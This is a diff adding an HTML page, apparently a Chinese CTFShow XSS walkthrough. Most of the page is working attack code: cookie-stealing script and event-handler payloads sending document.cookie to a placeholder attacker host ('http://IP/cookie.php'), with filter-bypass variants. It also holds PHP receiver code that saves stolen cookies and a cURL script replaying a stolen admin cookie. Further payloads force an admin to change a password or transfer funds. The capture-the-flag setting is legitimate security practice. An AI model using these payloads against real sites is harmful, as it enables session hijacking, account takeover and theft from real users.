@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFShow XSS 闯关指南</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>CTFShow XSS 闯关指南</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#ctfshow-xss">CTFShow XSS</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <section id="ctfshow-xss">
+            <h2>CTFShow XSS 漏洞闯关详解</h2>
+
+            <article>
+                <h3>获取 Cookie</h3>
+                <p>以下代码可用于获取对方cookie并发送cookie到攻击者的地址：</p>
+                <pre><code>&lt;script&gt;window.open(&quot;http://IP/cookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;</code></pre>
+                <pre><code>&lt;script&gt;location.href=&quot;http://IP/cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>script 过滤绕过</h3>
+                <p>可使用以下方式绕过 script 过滤：</p>
+                <pre><code>&lt;input onfocus=&quot;window.open('http://IP/cookie.php?cookie='+document.cookie)&quot; autofocus&gt;&lt;/input&gt;</code></pre>
+                <pre><code>&lt;iframe onload=&quot;window.open('http://IP/cookie.php?cookie='+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre>
+                <pre><code>&lt;body onload=&quot;location.href='http://IP/cookie.php?cookie='+document.cookie&quot;&gt;&lt;/body&gt;</code></pre>
+                <pre><code>&lt;svg onload=window.location.href='IP/cookie.php?cookie='+document.cookie&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>空格绕过</h3>
+                <p>可使用以下方式绕过空格过滤：</p>
+                <pre><code>&lt;iframe/onload=&quot;window.open('http://IP/cookie.php?cookie='+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre>
+                <pre><code>&lt;body/onload=&quot;location.href='http://IP/cookie.php?cookie='+document.cookie&quot;&gt;&lt;/body&gt;</code></pre>
+                <pre><code>&lt;svg/onload=window.location.href='IP/cookie.php?cookie='+document.cookie&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>cookie.php 代码</h3>
+                <p>以下是用于接收并保存Cookie的PHP代码,放在攻击者的服务器上：</p>
+                <pre><code>
+&lt;?php
+$cookie=$_GET['cookie'];
+$f=fopen('cookie.txt','w+');
+fwrite($f,$cookie);
+fclose($f);
+>
+                </code></pre>
+            </article>
+
+            <article>
+                <h3>获取到过时的Cookie,管理员登录后访问了该xss就退出了</h3>
+                <p>这一关和上一关很像,但是有一个区别就是能得到cookie访问不了页面。原因是管理员访问了页面就退出了,相当于现在得到的最新cookie是管理员上一次用的cookie。</p>
+                <p>以下是改进后的cookie.php代码,利用获取到的管理员的cookie并保存访问到的相应数据包,防止cookie过时：</p>
+                <pre><code>
+&lt;?php
+// 获取GET参数中的cookie值
+$cookie = $_GET['cookie'];
+// 初始化cURL会话
+$ch = curl_init();
+// 设置cURL选项
+curl_setopt($ch, CURLOPT_URL, "http://88a53766-9c1f-4a28-8a99-9ea720bc15f7.challenge.ctf.show/api/?page=1&limit=10");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回数据而不是直接输出
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    "Host: 88a53766-9c1f-4a28-8a99-9ea720bc15f7.challenge.ctf.show",
+    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
+    "Accept: application/json, text/javascript, */*; q=0.01",
+    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+    "Accept-Encoding: gzip, deflate",
+    "X-Requested-With: XMLHttpRequest",
+    "Referer: http://88a53766-9c1f-4a28-8a99-9ea720bc15f7.challenge.ctf.show/manager.php",
+    "Cookie: $cookie",
+    "DNT: 1",
+    "Connection: close"
+]);
+// 接受压缩编码的数据
+curl_setopt($ch, CURLOPT_ENCODING, ""); // 允许cURL自动解压缩响应内容
+// 执行cURL请求并获取响应数据
+$response = curl_exec($ch);
+// 检查是否有错误
+if ($response === false) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    // 保存响应数据到文件
+    file_put_contents("response.txt", $response);
+    echo "Response saved to response.txt";
+}
+// 关闭cURL会话
+curl_close($ch);
+?>
+                </code></pre>
+                <p>对应的 payload 为：</p>
+                <pre><code>&lt;script&gt;location.href=&quot;http://IP/cookie.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>让管理员修改密码</h3>
+                <p>以下payload可让admin自己访问修改密码的链接自己去修改自己的密码：</p>
+                <pre><code>&lt;script&gt;location.href=&quot;http://127.0.0.1/api/change.php?p=111111&quot;&gt;&lt;/script&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>使用 POST 方式修改密码</h3>
+                <p>以下 payload 使用 POST 方式提交修改密码请求：</p>
+                <pre><code>&lt;script&gt;$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'111111'}});&lt;/script&gt;</code></pre>
+            </article>
+
+            <article>
+                <h3>购买 flag</h3>
+                <p>这关抓包发现 u 是向谁转钱,a 是转钱金额,先注册 zzf 这个号,再注册 payload 这个号,当管理员访问管理页面时就会向 zzf 转 99999。对应的 payload 为：</p>
+                <pre><code>&lt;script&gt;$.ajax({url:'http://127.0.0.1/api/amount.php',type:'post',data:{u:'zzf',a:99999}});&lt;/script&gt;</code></pre>
+            </article>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>
